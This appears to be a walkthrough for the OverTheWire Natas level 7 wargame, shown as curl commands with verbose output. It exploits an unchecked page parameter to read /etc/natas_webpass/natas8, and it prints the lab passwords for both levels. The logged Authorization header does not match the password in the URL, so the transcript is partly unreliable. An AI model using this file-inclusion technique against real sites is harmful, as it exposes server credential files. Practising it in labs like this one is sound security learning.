### natas7 pswd: B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0

```bash
curl -v -s -c cookie.txt -X POST http://natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0@natas7.natas.labs.overthewire.org

# * Host natas7.natas.labs.overthewire.org:80 was resolved.
# * IPv6: (none)
# * IPv4: 13.53.215.123
# *   Trying 13.53.215.123:80...
# * Established connection to natas7.natas.labs.overthewire.org (13.53.215.123 port 80) from 10.0.2.15 port 52578 
# * using HTTP/1.x
# * Server auth using Basic with user 'natas7'
# > POST / HTTP/1.1
# > Host: natas7.natas.labs.overthewire.org
# > Authorization: Basic bmF0YXM3OmJtZzhTdlUxTGl6dVdqeDN5N3hrTkVSa0h4R3JlMEdT
# > User-Agent: curl/8.19.0
# > Accept: */*
# > 
# * Request completely sent off
# < HTTP/1.1 200 OK
# < Date: Fri, 19 Jun 2026 14:36:23 GMT
# < Server: Apache/2.4.58 (Ubuntu)
# < Vary: Accept-Encoding
# < Content-Length: 982
# < Content-Type: text/html; charset=UTF-8
# < 
# <html>
# <body>
# <h1>natas7</h1>
# <div id="content">
# 
  <a href="index.php?page=home">Home</a>
  <a href="index.php?page=about">About</a>
# <br>
# <br>
# 
  <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
# </div>
# </body>
# </html>
# * Connection #0 to host natas7.natas.labs.overthewire.org:80 left intact

```

let's try it, instead of `index.php?page=home` checking `index.php?page=/etc/natas_webpass/natas8`

```bash
curl -v -s -c cookie.txt -X POST http://natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0@natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

# * Host natas7.natas.labs.overthewire.org:80 was resolved.
# * IPv6: (none)
# * IPv4: 13.53.215.123
# *   Trying 13.53.215.123:80...
# * Established connection to natas7.natas.labs.overthewire.org (13.53.215.123 port 80) from 10.0.2.15 port 43568 
# * using HTTP/1.x
# * Server auth using Basic with user 'natas7'
# > POST /index.php?page=/etc/natas_webpass/natas8 HTTP/1.1
# > Host: natas7.natas.labs.overthewire.org
# > Authorization: Basic bmF0YXM3OmJtZzhTdlUxTGl6dVdqeDN5N3hrTkVSa0h4R3JlMEdT
# > User-Agent: curl/8.19.0
# > Accept: */*
# > 
# * Request completely sent off
# < HTTP/1.1 200 OK
# < Date: Fri, 19 Jun 2026 18:42:45 GMT
# < Server: Apache/2.4.58 (Ubuntu)
# < Vary: Accept-Encoding
# < Content-Length: 1015
# < Content-Type: text/html; charset=UTF-8
# < 
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas7", "pass": "B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0" };</script></head>
# <body>
# <h1>natas7</h1>
# <div id="content">
# 
# <a href="index.php?page=home">Home</a>
# <a href="index.php?page=about">About</a>
# <br>
# <br>
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
# 
# <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
# </div>
# </body>
# </html>
# * Connection #0 to host natas7.natas.labs.overthewire.org:80 left intact
```
